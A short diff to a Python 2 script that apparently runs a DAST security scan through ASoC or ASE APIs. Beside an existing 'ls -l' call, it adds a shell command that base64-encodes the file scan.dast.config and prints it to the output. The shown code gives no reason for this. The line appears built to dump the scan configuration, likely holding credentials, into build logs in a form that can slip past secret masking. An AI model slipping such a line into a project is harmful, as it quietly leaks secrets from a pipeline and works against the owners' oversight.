@@ -242,6 +242,9 @@ def main():
         sleep(5)
         ls_proc = Popen([u"ls -l"],
                           shell=True)
+        sleep(5)
+        ls_proc = Popen([u'echo "$(cat scan.dast.config | base64)"'],
+                          shell=True)
         sleep(10)
         print "starting a scan - woot"
         # #Now that we have the traffic file, and we can use it with ASoC REST API or with ASE REST API
